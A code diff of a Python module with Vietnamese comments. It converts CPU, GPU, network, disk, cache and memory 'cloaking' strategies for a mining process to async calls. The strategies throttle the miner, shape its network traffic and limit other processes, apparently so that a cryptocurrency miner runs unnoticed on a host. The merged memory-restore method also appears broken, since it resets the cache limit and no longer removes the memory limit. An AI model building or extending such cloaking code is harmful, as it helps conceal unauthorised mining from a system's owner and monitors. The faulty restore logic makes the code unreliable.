@@ -9,8 +9,7 @@ import traceback
 from abc import ABC, abstractmethod
 from typing import Dict, Any, List, Tuple, Optional, Type
 
-
-
+import asyncio
 
 from .utils import MiningProcess  # Import MiningProcess từ utils.py
 from .resource_control import (
@@ -29,7 +28,7 @@ class CloakStrategy(ABC):
     """
 
     @abstractmethod
-    def apply(self, process: MiningProcess) -> None:
+    async def apply(self, process: MiningProcess) -> None:
         """
         Áp dụng chiến lược cloaking cho tiến trình đã cho.
 
@@ -39,7 +38,7 @@ class CloakStrategy(ABC):
         pass
 
     @abstractmethod
-    def restore(self, process: MiningProcess) -> None:
+    async def restore(self, process: MiningProcess) -> None:
         """
         Khôi phục các thiết lập cloaking cho tiến trình đã cho.
 
@@ -98,7 +97,7 @@ class CpuCloakStrategy(CloakStrategy):
 
         self.logger = logger
 
-    def apply(self, process: MiningProcess) -> None:
+    async def apply(self, process: MiningProcess) -> None:
         """
         Áp dụng chiến lược cloaking CPU cho tiến trình đã cho.
 
@@ -108,8 +107,15 @@ class CpuCloakStrategy(CloakStrategy):
         try:
             pid, process_name = self.get_process_info(process)
 
+            loop = asyncio.get_event_loop()
+
             # Giới hạn sử dụng CPU cho tiến trình mục tiêu bằng cgroups
-            cgroup_name = self.cpu_resource_manager.throttle_cpu_usage(pid, self.throttle_percentage)
+            cgroup_name = await loop.run_in_executor(
+                None,
+                self.cpu_resource_manager.throttle_cpu_usage,
+                pid,
+                self.throttle_percentage
+            )
             if cgroup_name:
                 self.process_cgroup[pid] = cgroup_name
                 self.logger.info(f"Giới hạn sử dụng CPU cho tiến trình {process_name} (PID: {pid}) thành công với throttle_percentage={self.throttle_percentage}%.")
@@ -118,23 +124,34 @@ class CpuCloakStrategy(CloakStrategy):
                 return
 
             # Tối ưu hóa việc sử dụng cache
-            success_optimize_cache = self.cpu_resource_manager.optimize_cache_usage(pid)
+            success_optimize_cache = await loop.run_in_executor(
+                None,
+                self.cpu_resource_manager.optimize_cache_usage,
+                pid
+            )
             if success_optimize_cache:
                 self.logger.info(f"Tối ưu hóa sử dụng cache cho tiến trình {process_name} (PID: {pid}) thành công.")
             else:
                 self.logger.warning(f"Không thể tối ưu hóa sử dụng cache cho tiến trình {process_name} (PID: {pid}).")
 
             # Đặt CPU affinity
-            success_affinity = self.cpu_resource_manager.optimize_thread_scheduling(pid, self.target_cores)
+            success_affinity = await loop.run_in_executor(
+                None,
+                self.cpu_resource_manager.optimize_thread_scheduling,
+                pid,
+                self.target_cores
+            )
             if success_affinity:
                 self.logger.info(f"Tối ưu hóa scheduling cho tiến trình {process_name} (PID: {pid}) thành công.")
             else:
                 self.logger.warning(f"Không thể tối ưu hóa scheduling cho tiến trình {process_name} (PID: {pid}).")
 
             # Hạn chế CPU cho các tiến trình bên ngoài
-            success_limit_external = self.cpu_resource_manager.limit_cpu_for_external_processes(
-                target_pids=[pid] + self.exempt_pids,
-                throttle_percentage=self.throttle_external_percentage
+            success_limit_external = await loop.run_in_executor(
+                None,
+                self.cpu_resource_manager.limit_cpu_for_external_processes,
+                [pid] + self.exempt_pids,
+                self.throttle_external_percentage
             )
             if success_limit_external:
                 self.logger.info(f"Hạn chế CPU cho các tiến trình bên ngoài thành công với throttle_percentage={self.throttle_external_percentage}%.")
@@ -151,7 +168,7 @@ class CpuCloakStrategy(CloakStrategy):
             )
             raise
 
-    def restore(self, process: MiningProcess) -> None:
+    async def restore(self, process: MiningProcess) -> None:
         """
         Khôi phục các thiết lập cloaking CPU cho tiến trình đã cho.
 
@@ -161,10 +178,16 @@ class CpuCloakStrategy(CloakStrategy):
         try:
             pid, process_name = self.get_process_info(process)
 
+            loop = asyncio.get_event_loop()
+
             # Khôi phục các thiết lập CPU bằng cách xóa cgroup
             cgroup_name = self.process_cgroup.get(pid)
             if cgroup_name:
-                success_restore = self.cpu_resource_manager.restore_cpu_settings(cgroup_name)
+                success_restore = await loop.run_in_executor(
+                    None,
+                    self.cpu_resource_manager.restore_cpu_settings,
+                    cgroup_name
+                )
                 if success_restore:
                     self.logger.info(f"Khôi phục các thiết lập CPU cho tiến trình {process_name} (PID: {pid}) thành công.")
                 else:
@@ -174,9 +197,11 @@ class CpuCloakStrategy(CloakStrategy):
                 self.logger.warning(f"Không tìm thấy cgroup cho PID={pid} khi khôi phục.")
 
             # Hủy giới hạn CPU cho các tiến trình bên ngoài nếu cần
-            success_unlimit_external = self.cpu_resource_manager.limit_cpu_for_external_processes(
-                target_pids=[pid] + self.exempt_pids,
-                throttle_percentage=0  # Đặt lại throttle_percentage về 0 để không hạn chế
+            success_unlimit_external = await loop.run_in_executor(
+                None,
+                self.cpu_resource_manager.limit_cpu_for_external_processes,
+                [pid] + self.exempt_pids,
+                0  # Đặt lại throttle_percentage về 0 để không hạn chế
             )
             if success_unlimit_external:
                 self.logger.info("Đã hủy giới hạn CPU cho các tiến trình bên ngoài.")
@@ -254,7 +279,7 @@ class GpuCloakStrategy(CloakStrategy):
 
         self.logger = logger
 
-    def apply(self, process: MiningProcess) -> None:
+    async def apply(self, process: MiningProcess) -> None:
         """
         Áp dụng chiến lược cloaking GPU cho tiến trình đã cho.
 
@@ -264,8 +289,14 @@ class GpuCloakStrategy(CloakStrategy):
         try:
             pid, process_name = self.get_process_info(process)
 
+            loop = asyncio.get_event_loop()
+
             # Gán nhiều GPU cho tiến trình
-            gpu_indices = self.assign_gpus(pid)
+            gpu_indices = await loop.run_in_executor(
+                None,
+                self.assign_gpus,
+                pid
+            )
             if not gpu_indices:
                 self.logger.warning(f"Không thể gán GPU cho tiến trình {process_name} (PID: {pid}).")
                 return
@@ -273,21 +304,36 @@ class GpuCloakStrategy(CloakStrategy):
             for gpu_index in gpu_indices:
                 # Lưu trữ và thiết lập power limit
                 desired_power_limit_w = self.calculate_desired_power_limit(gpu_index)
-                success_power = self.gpu_resource_manager.set_gpu_power_limit(pid, gpu_index, desired_power_limit_w)
+                success_power = await loop.run_in_executor(
+                    None,
+                    self.gpu_resource_manager.set_gpu_power_limit,
+                    pid,
+                    gpu_index,
+                    desired_power_limit_w
+                )
                 if success_power:
                     self.logger.info(f"Đặt power limit GPU {gpu_index} thành công lên {desired_power_limit_w}W cho tiến trình {process_name} (PID: {pid}).")
                 else:
                     self.logger.error(f"Không thể đặt power limit GPU {gpu_index} cho tiến trình {process_name} (PID: {pid}).")
 
                 # Lưu trữ và thiết lập xung nhịp GPU
-                success_clocks = self.gpu_resource_manager.set_gpu_clocks(pid, gpu_index, self.target_sm_clock, self.target_mem_clock)
+                success_clocks = await loop.run_in_executor(
+                    None,
+                    self.gpu_resource_manager.set_gpu_clocks,
+                    pid,
+                    gpu_index,
+                    self.target_sm_clock,
+                    self.target_mem_clock
+                )
                 if success_clocks:
                     self.logger.info(f"Đặt xung nhịp GPU {gpu_index}: SM={self.target_sm_clock}MHz, MEM={self.target_mem_clock}MHz cho tiến trình {process_name} (PID: {pid}).")
                 else:
                     self.logger.warning(f"Không thể đặt xung nhịp GPU {gpu_index} cho tiến trình {process_name} (PID: {pid}).")
 
                 # Giới hạn nhiệt độ GPU
-                success_temp = self.gpu_resource_manager.limit_temperature(
+                success_temp = await loop.run_in_executor(
+                    None,
+                    self.gpu_resource_manager.limit_temperature,
                     gpu_index,
                     self.temperature_threshold,
                     self.fan_speed_increase
@@ -307,7 +353,7 @@ class GpuCloakStrategy(CloakStrategy):
             )
             raise
 
-    def restore(self, process: MiningProcess) -> None:
+    async def restore(self, process: MiningProcess) -> None:
         """
         Khôi phục các thiết lập cloaking GPU cho tiến trình đã cho.
 
@@ -317,8 +363,14 @@ class GpuCloakStrategy(CloakStrategy):
         try:
             pid, process_name = self.get_process_info(process)
 
+            loop = asyncio.get_event_loop()
+
             # Khôi phục các thiết lập GPU cho tiến trình
-            success_restore_gpu = self.gpu_resource_manager.restore_resources(pid)
+            success_restore_gpu = await loop.run_in_executor(
+                None,
+                self.gpu_resource_manager.restore_resources,
+                pid
+            )
             if success_restore_gpu:
                 self.logger.info(f"Đã khôi phục tất cả các thiết lập GPU cho tiến trình {process_name} (PID: {pid}).")
             else:
@@ -430,7 +482,7 @@ class NetworkCloakStrategy(CloakStrategy):
         # Thêm thuộc tính để lưu trữ fwmark cho tiến trình
         self.process_marks: Dict[int, int] = {}
 
-    def apply(self, process: MiningProcess) -> None:
+    async def apply(self, process: MiningProcess) -> None:
         """
         Áp dụng chiến lược cloaking mạng cho tiến trình đã cho.
 
@@ -440,18 +492,27 @@ class NetworkCloakStrategy(CloakStrategy):
         try:
             pid, process_name = self.get_process_info(process)
 
+            loop = asyncio.get_event_loop()
+
             # Định nghĩa fwmark cho tiến trình cụ thể
             mark = pid % 32768  # fwmark phải < 65536
             self.logger.debug(f"Đặt fwmark={mark} cho tiến trình PID={pid}.")
 
             # Thêm quy tắc iptables để đánh dấu các gói tin từ PID này
-            success_mark = self.network_resource_manager.mark_packets(pid, mark)
+            success_mark = await loop.run_in_executor(
+                None,
+                self.network_resource_manager.mark_packets,
+                pid,
+                mark
+            )
             if not success_mark:
                 self.logger.error(f"Không thể thêm iptables MARK cho tiến trình {process_name} (PID: {pid}) với mark={mark}.")
                 return
 
             # Thiết lập băng thông mạng thông qua NetworkResourceManager
-            success_limit = self.network_resource_manager.limit_bandwidth(
+            success_limit = await loop.run_in_executor(
+                None,
+                self.network_resource_manager.limit_bandwidth,
                 self.network_interface,
                 mark,
                 self.bandwidth_reduction_mbps
@@ -478,7 +539,7 @@ class NetworkCloakStrategy(CloakStrategy):
             )
             raise
 
-    def restore(self, process: MiningProcess) -> None:
+    async def restore(self, process: MiningProcess) -> None:
         """
         Khôi phục các thiết lập cloaking mạng cho tiến trình đã cho.
 
@@ -488,6 +549,8 @@ class NetworkCloakStrategy(CloakStrategy):
         try:
             pid, process_name = self.get_process_info(process)
 
+            loop = asyncio.get_event_loop()
+
             # Lấy fwmark đã lưu trữ
             mark = self.process_marks.get(pid)
             if mark is None:
@@ -495,7 +558,9 @@ class NetworkCloakStrategy(CloakStrategy):
                 return
 
             # Xóa giới hạn băng thông mạng
-            success_remove = self.network_resource_manager.remove_bandwidth_limit(
+            success_remove = await loop.run_in_executor(
+                None,
+                self.network_resource_manager.remove_bandwidth_limit,
                 self.network_interface,
                 mark
             )
@@ -505,7 +570,12 @@ class NetworkCloakStrategy(CloakStrategy):
                 self.logger.error(f"Không thể khôi phục giới hạn băng thông mạng cho tiến trình {process_name} (PID: {pid}).")
 
             # Xóa quy tắc iptables MARK
-            success_unmark = self.network_resource_manager.unmark_packets(pid, mark)
+            success_unmark = await loop.run_in_executor(
+                None,
+                self.network_resource_manager.unmark_packets,
+                pid,
+                mark
+            )
             if success_unmark:
                 self.logger.info(f"Xóa iptables MARK cho tiến trình {process_name} (PID: {pid}) thành công.")
             else:
@@ -585,7 +655,7 @@ class DiskIoCloakStrategy(CloakStrategy):
         # Khởi tạo DiskIOResourceManager trực tiếp
         self.disk_io_resource_manager = DiskIOResourceManager(logger)
 
-    def apply(self, process: MiningProcess) -> None:
+    async def apply(self, process: MiningProcess) -> None:
         """
         Áp dụng chiến lược cloaking Disk I/O cho tiến trình đã cho.
 
@@ -595,8 +665,15 @@ class DiskIoCloakStrategy(CloakStrategy):
         try:
             pid, process_name = self.get_process_info(process)
 
+            loop = asyncio.get_event_loop()
+
             # Đặt trọng số I/O thông qua DiskIOResourceManager
-            success = self.disk_io_resource_manager.set_io_weight(pid, self.io_weight)
+            success = await loop.run_in_executor(
+                None,
+                self.disk_io_resource_manager.set_io_weight,
+                pid,
+                self.io_weight
+            )
             if success:
                 self.logger.info(f"Đặt I/O weight là {self.io_weight} cho tiến trình {process_name} (PID: {pid}).")
             else:
@@ -617,7 +694,7 @@ class DiskIoCloakStrategy(CloakStrategy):
             )
             raise
 
-    def restore(self, process: MiningProcess) -> None:
+    async def restore(self, process: MiningProcess) -> None:
         """
         Khôi phục các thiết lập cloaking Disk I/O cho tiến trình đã cho.
 
@@ -627,8 +704,15 @@ class DiskIoCloakStrategy(CloakStrategy):
         try:
             pid, process_name = self.get_process_info(process)
 
+            loop = asyncio.get_event_loop()
+
             # Xóa trọng số I/O
-            success = self.disk_io_resource_manager.set_io_weight(pid, 1000)  # Giả sử 1000 là trọng số tối đa
+            success = await loop.run_in_executor(
+                None,
+                self.disk_io_resource_manager.set_io_weight,
+                pid,
+                1000  # Giả sử 1000 là trọng số tối đa
+            )
             if success:
                 self.logger.info(f"Khôi phục I/O weight cho tiến trình {process_name} (PID: {pid}) thành công.")
             else:
@@ -691,7 +775,7 @@ class CacheCloakStrategy(CloakStrategy):
         # Khởi tạo CacheResourceManager trực tiếp
         self.cache_resource_manager = CacheResourceManager(logger)
 
-    def apply(self, process: MiningProcess) -> None:
+    async def apply(self, process: MiningProcess) -> None:
         """
         Áp dụng chiến lược cloaking Cache cho tiến trình đã cho.
 
@@ -701,15 +785,24 @@ class CacheCloakStrategy(CloakStrategy):
         try:
             pid, process_name = self.get_process_info(process)
 
+            loop = asyncio.get_event_loop()
+
             # Drop caches thông qua CacheResourceManager
-            success_drop = self.cache_resource_manager.drop_caches()
+            success_drop = await loop.run_in_executor(
+                None,
+                self.cache_resource_manager.drop_caches
+            )
             if success_drop:
                 self.logger.info(f"Đã drop caches để giảm sử dụng cache cho tiến trình {process_name} (PID: {pid}).")
             else:
                 self.logger.error(f"Không thể drop caches cho tiến trình {process_name} (PID: {pid}).")
 
             # Giới hạn cache sử dụng thông qua CacheResourceManager
-            success_limit = self.cache_resource_manager.limit_cache_usage(self.cache_limit_percent)
+            success_limit = await loop.run_in_executor(
+                None,
+                self.cache_resource_manager.limit_cache_usage,
+                self.cache_limit_percent
+            )
             if success_limit:
                 self.logger.info(f"Đặt giới hạn cache thành {self.cache_limit_percent}% cho tiến trình {process_name} (PID: {pid}).")
             else:
@@ -735,7 +828,7 @@ class CacheCloakStrategy(CloakStrategy):
             )
             raise
 
-    def restore(self, process: MiningProcess) -> None:
+    async def restore(self, process: MiningProcess) -> None:
         """
         Khôi phục các thiết lập cloaking Cache cho tiến trình đã cho.
 
@@ -745,12 +838,20 @@ class CacheCloakStrategy(CloakStrategy):
         try:
             pid, process_name = self.get_process_info(process)
 
+            loop = asyncio.get_event_loop()
+
             # Reset cache usage bằng cách không giới hạn
-            success_limit = self.cache_resource_manager.limit_cache_usage(100)  # Đặt lại về 100%
+            success_limit = await loop.run_in_executor(
+                None,
+                self.cache_resource_manager.limit_cache_usage,
+                100  # Đặt lại về 100%
+            )
             if success_limit:
                 self.logger.info(f"Khôi phục giới hạn cache cho tiến trình {process_name} (PID: {pid}) thành công.")
             else:
                 self.logger.error(f"Không thể khôi phục giới hạn cache cho tiến trình {process_name} (PID: {pid}).")
+
+            # Không cần drop caches lại khi khôi phục
 
             self.logger.info(
                 f"Khôi phục cloaking Cache cho tiến trình {process_name} (PID: {pid}) đã hoàn thành."
@@ -815,7 +916,7 @@ class MemoryCloakStrategy(CloakStrategy):
         self.memory_resource_manager = MemoryResourceManager(logger)
         self.cache_resource_manager = CacheResourceManager(logger)
 
-    def apply(self, process: MiningProcess) -> None:
+    async def apply(self, process: MiningProcess) -> None:
         """
         Áp dụng chiến lược cloaking Memory cho tiến trình đã cho.
 
@@ -825,8 +926,13 @@ class MemoryCloakStrategy(CloakStrategy):
         try:
             pid, process_name = self.get_process_info(process)
 
+            loop = asyncio.get_event_loop()
+
             # Drop caches sử dụng CacheResourceManager
-            success_drop = self.cache_resource_manager.drop_caches()
+            success_drop = await loop.run_in_executor(
+                None,
+                self.cache_resource_manager.drop_caches
+            )
             if success_drop:
                 self.logger.info(f"Đã drop caches để giảm sử dụng cache cho tiến trình {process_name} (PID: {pid}).")
             else:
@@ -834,7 +940,12 @@ class MemoryCloakStrategy(CloakStrategy):
 
             # Giới hạn sử dụng bộ nhớ sử dụng MemoryResourceManager
             memory_limit_mb = self.calculate_memory_limit_mb()
-            success_limit = self.memory_resource_manager.set_memory_limit(pid, memory_limit_mb)
+            success_limit = await loop.run_in_executor(
+                None,
+                self.memory_resource_manager.set_memory_limit,
+                pid,
+                memory_limit_mb
+            )
             if success_limit:
                 self.logger.info(f"Đặt giới hạn bộ nhớ thành {self.memory_limit_percent}% ({memory_limit_mb}MB) cho tiến trình {process_name} (PID: {pid}).")
             else:
@@ -860,7 +971,7 @@ class MemoryCloakStrategy(CloakStrategy):
             )
             raise
 
-    def restore(self, process: MiningProcess) -> None:
+    async def restore(self, process: MiningProcess) -> None:
         """
         Khôi phục các thiết lập cloaking Memory cho tiến trình đã cho.
 
@@ -870,148 +981,14 @@ class MemoryCloakStrategy(CloakStrategy):
         try:
             pid, process_name = self.get_process_info(process)
 
-            # Giới hạn bộ nhớ về không giới hạn
-            success_limit = self.memory_resource_manager.remove_memory_limit(pid)
-            if success_limit:
-                self.logger.info(f"Khôi phục giới hạn bộ nhớ cho tiến trình {process_name} (PID: {pid}) thành công.")
-            else:
-                self.logger.error(f"Không thể khôi phục giới hạn bộ nhớ cho tiến trình {process_name} (PID: {pid}).")
-
-            # Không cần drop caches lại khi khôi phục
-
-            self.logger.info(
-                f"Khôi phục cloaking Memory cho tiến trình {process_name} (PID: {pid}) đã hoàn thành."
-            )
-
-        except PermissionError as e:
-            self.logger.error(
-                f"Không đủ quyền để khôi phục cloaking Memory cho tiến trình {process.name} (PID: {process.pid})."
-            )
-            raise
-        except psutil.NoSuchProcess as e:
-            self.logger.error(f"Tiến trình không tồn tại: {e}")
-        except psutil.AccessDenied as e:
-            self.logger.error(f"Không đủ quyền để khôi phục cloaking Memory cho PID {process.pid}: {e}")
-        except Exception as e:
-            self.logger.error(
-                f"Lỗi bất ngờ khi khôi phục cloaking Memory cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
-            )
-            raise
-
-    def calculate_memory_limit_mb(self) -> int:
-        """
-        Tính toán giới hạn bộ nhớ dựa trên memory_limit_percent.
-
-        Returns:
-            int: Giới hạn bộ nhớ tính bằng MB.
-        """
-        total_memory_bytes = psutil.virtual_memory().total
-        memory_limit_bytes = int((self.memory_limit_percent / 100) * total_memory_bytes)
-        memory_limit_mb = int(memory_limit_bytes / (1024 * 1024))
-        self.logger.debug(f"Tính toán giới hạn bộ nhớ: {memory_limit_mb}MB.")
-        return memory_limit_mb
-
-    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
-        """
-        Lấy PID và tên tiến trình từ đối tượng process.
-
-        Args:
-            process (MiningProcess): Đối tượng tiến trình.
-
-        Returns:
-            Tuple[int, str]: PID và tên tiến trình.
-        """
-        return process.pid, process.name
-
-
-class MemoryCloakStrategy(CloakStrategy):
-    """
-    Chiến lược cloaking Memory:
-      - Giới hạn sử dụng bộ nhớ của tiến trình.
-      - Giảm sử dụng bộ nhớ bằng cách drop caches nếu cần thiết.
-      - Khôi phục các thiết lập ban đầu khi không còn cần cloaking.
-    """
-
-    def __init__(
-        self,
-        config: Dict[str, Any],
-        logger: logging.Logger
-    ):
-        """
-        Khởi tạo MemoryCloakStrategy với cấu hình và logger.
-
-        Args:
-            config (Dict[str, Any]): Cấu hình cho chiến lược cloaking Memory.
-            logger (logging.Logger): Logger để ghi log.
-        """
-        # Lấy cấu hình memory_limit_percent với giá trị mặc định là 50%
-        self.memory_limit_percent = config.get('memory_limit_percent', 50)
-        if not (0 <= self.memory_limit_percent <= 100):
-            logger.warning(f"Giá trị memory_limit_percent không hợp lệ: {self.memory_limit_percent}. Mặc định là 50%.")
-            self.memory_limit_percent = 50
-        self.logger = logger
-
-        # Khởi tạo MemoryResourceManager và CacheResourceManager trực tiếp
-        self.memory_resource_manager = MemoryResourceManager(logger)
-        self.cache_resource_manager = CacheResourceManager(logger)
-
-    def apply(self, process: MiningProcess) -> None:
-        """
-        Áp dụng chiến lược cloaking Memory cho tiến trình đã cho.
-
-        Args:
-            process (MiningProcess): Đối tượng tiến trình.
-        """
-        try:
-            pid, process_name = self.get_process_info(process)
-
-            # Drop caches sử dụng CacheResourceManager
-            success_drop = self.cache_resource_manager.drop_caches()
-            if success_drop:
-                self.logger.info(f"Đã drop caches để giảm sử dụng cache cho tiến trình {process_name} (PID: {pid}).")
-            else:
-                self.logger.error(f"Không thể drop caches cho tiến trình {process_name} (PID: {pid}).")
-
-            # Giới hạn sử dụng bộ nhớ sử dụng MemoryResourceManager
-            memory_limit_mb = self.calculate_memory_limit_mb()
-            success_limit = self.memory_resource_manager.set_memory_limit(pid, memory_limit_mb)
-            if success_limit:
-                self.logger.info(f"Đặt giới hạn bộ nhớ thành {self.memory_limit_percent}% ({memory_limit_mb}MB) cho tiến trình {process_name} (PID: {pid}).")
-            else:
-                self.logger.error(f"Không thể đặt giới hạn bộ nhớ thành {self.memory_limit_percent}% cho tiến trình {process_name} (PID: {pid}).")
-
-            self.logger.info(
-                f"Áp dụng cloaking Memory cho tiến trình {process_name} (PID: {pid}): "
-                f"drop_caches=True, memory_limit_percent={self.memory_limit_percent}%."
-            )
-
-        except PermissionError as e:
-            self.logger.error(
-                f"Không đủ quyền để drop caches. Cloaking Memory thất bại cho tiến trình {process.name} (PID: {process.pid})."
-            )
-            raise
-        except psutil.NoSuchProcess as e:
-            self.logger.error(f"Tiến trình không tồn tại: {e}")
-        except psutil.AccessDenied as e:
-            self.logger.error(f"Không đủ quyền để áp dụng cloaking Memory cho PID {process.pid}: {e}")
-        except Exception as e:
-            self.logger.error(
-                f"Lỗi bất ngờ khi áp dụng cloaking Memory cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
-            )
-            raise
-
-    def restore(self, process: MiningProcess) -> None:
-        """
-        Khôi phục các thiết lập cloaking Memory cho tiến trình đã cho.
-
-        Args:
-            process (MiningProcess): Đối tượng tiến trình.
-        """
-        try:
-            pid, process_name = self.get_process_info(process)
+            loop = asyncio.get_event_loop()
 
             # Reset cache usage bằng cách không giới hạn
-            success_limit = self.cache_resource_manager.limit_cache_usage(100)  # Đặt lại về 100%
+            success_limit = await loop.run_in_executor(
+                None,
+                self.cache_resource_manager.limit_cache_usage,
+                100  # Đặt lại về 100%
+            )
             if success_limit:
                 self.logger.info(f"Khôi phục giới hạn cache cho tiến trình {process_name} (PID: {pid}) thành công.")
             else:
@@ -1079,7 +1056,7 @@ class CloakStrategyFactory:
     }
 
     @staticmethod
-    def create_strategy(
+    async def create_strategy(
         strategy_name: str,
         config: Dict[str, Any],
         logger: logging.Logger
